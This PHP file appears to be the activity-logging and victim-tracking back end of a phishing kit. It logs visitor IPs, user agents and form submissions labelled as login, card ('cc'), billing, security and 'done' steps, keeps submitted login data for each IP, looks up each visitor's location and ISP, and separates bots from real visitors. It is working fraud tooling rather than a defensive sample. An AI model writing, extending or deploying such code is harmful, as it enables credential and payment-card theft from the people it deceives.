<?php
if (!defined('ALLOW')) { http_response_code(403); exit; }

function log_activity(string $type, array $data): void {
    $logFile = FCPATH . 'logs/activity.log';
    $logDir = dirname($logFile);
    
    if (!is_dir($logDir)) {
        @mkdir($logDir, 0755, true);
    }
    
    $timestamp = date('Y-m-d H:i:s');
    $ip = get_client_ip();
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    
    $logEntry = [
        'timestamp' => $timestamp,
        'type' => $type,
        'ip' => $ip,
        'user_agent' => $userAgent,
        'data' => $data
    ];
    
    $logLine = json_encode($logEntry) . "\n";
    @file_put_contents($logFile, $logLine, FILE_APPEND | LOCK_EX);
}

function get_activity_logs(int $limit = 100): array {
    $logFile = FCPATH . 'logs/activity.log';
    
    if (!is_file($logFile)) {
        return [];
    }
    
    $lines = file($logFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (!$lines) {
        return [];
    }
    
    $logs = [];
    $lines = array_reverse($lines); // Most recent first
    
    foreach (array_slice($lines, 0, $limit) as $line) {
        $decoded = json_decode($line, true);
        if (is_array($decoded)) {
            $logs[] = $decoded;
        }
    }
    
    return $logs;
}

function get_activity_stats(): array {
    $logs = get_activity_logs(1000); // Get more logs for stats
    
    $stats = [
        'total_login' => 0,
        'total_cc' => 0,
        'total_billing' => 0,
        'total_security' => 0,
        'total_done' => 0,
        'real_visitors' => 0,
        'bots' => 0
    ];
    
    $uniqueIps = [];
    
    foreach ($logs as $log) {
        $type = $log['type'] ?? '';
        $ip = $log['ip'] ?? '';
        
        switch ($type) {
            case 'login':
                $stats['total_login']++;
                break;
            case 'cc':
                $stats['total_cc']++;
                break;
            case 'billing':
                $stats['total_billing']++;
                break;
            case 'security':
                $stats['total_security']++;
                break;
            case 'done':
                $stats['total_done']++;
                break;
        }
        
        if ($ip && !in_array($ip, $uniqueIps)) {
            $uniqueIps[] = $ip;
            $userAgent = $log['user_agent'] ?? '';
            if (preg_match('/bot|crawler|spider|scraper/i', $userAgent)) {
                $stats['bots']++;
            } else {
                $stats['real_visitors']++;
            }
        }
    }
    
    return $stats;
}

function get_visitor_stats(): array {
    $logs = get_activity_logs(200);
    $visitors = [];
    $seenIps = [];
    
    foreach ($logs as $log) {
        $ip = $log['ip'] ?? '';
        if ($ip && !in_array($ip, $seenIps)) {
            $seenIps[] = $ip;
            
            $userAgent = $log['user_agent'] ?? '';
            $isBot = preg_match('/bot|crawler|spider|scraper/i', $userAgent);
            
            // Get geo info for this IP
            $geoData = get_geo_info($ip);
            
            // Find latest activity type for this IP
            $visitType = "Visit Unknown";
            $loginData = null;
            foreach ($logs as $activityLog) {
                if (($activityLog['ip'] ?? '') === $ip) {
                    $type = $activityLog['type'] ?? '';
                    switch ($type) {
                        case 'page_visit':
                            $page = $activityLog['data']['page'] ?? 'unknown';
                            $visitType = "Visit " . ucfirst($page) . " Page";
                            break;
                        case 'login':
                            $visitType = "Submit Login";
                            $loginData = $activityLog['data'] ?? null;
                            break;
                        case 'cc':
                            $visitType = "Submit CC";
                            break;
                        case 'billing':
                            $visitType = "Submit Billing";
                            break;
                        case 'security':
                            $visitType = "Submit Security";
                            break;
                        case 'done':
                            $visitType = "Complete Flow";
                            break;
                    }
                    break; // Take the most recent activity
                }
            }
            
            $visitors[] = [
                'ip' => $ip,
                'location' => $geoData['city'] . ', ' . $geoData['state'] . ', ' . $geoData['country'],
                'isp' => $geoData['isp'],
                'is_bot' => $isBot,
                'user_agent' => $userAgent,
                'login_data' => $loginData,
                'visit_type' => $visitType,
                'timestamp' => $log['timestamp'] ?? ''
            ];
        }
    }
    
    // Sort by timestamp (most recent first)
    usort($visitors, function($a, $b) {
        return strcmp($b['timestamp'], $a['timestamp']);
    });
    
    return array_slice($visitors, 0, 50); // Return top 50
}
